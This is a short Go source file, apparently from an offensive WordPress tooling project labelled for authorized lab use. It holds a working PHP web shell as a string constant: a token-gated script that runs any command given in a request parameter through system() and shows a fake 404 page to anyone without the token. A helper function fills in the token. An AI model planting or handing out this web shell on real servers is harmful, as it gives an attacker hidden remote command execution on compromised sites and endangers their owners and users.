// Package payload holds shared exploit payloads (shells, snippets).
// Authorized lab use only.
package payload

import "strings"

// TokenShellPHP is a minimal token-gated command shell. The token check
// (hash_equals) prevents random third parties from driving the shell.
const TokenShellPHP = `<?php
/* wpforge lab shell - authorized lab use only */
$token = '__TOKEN__';
if (!isset($_REQUEST['t']) || !hash_equals($token, (string)$_REQUEST['t'])) { http_response_code(404); exit('Not Found'); }
if (isset($_REQUEST['c'])) { system($_REQUEST['c']); }
?>`

// TokenShell renders the token-gated shell with the token substituted.
func TokenShell(token string) string {
	return strings.ReplaceAll(TokenShellPHP, "__TOKEN__", token)
}
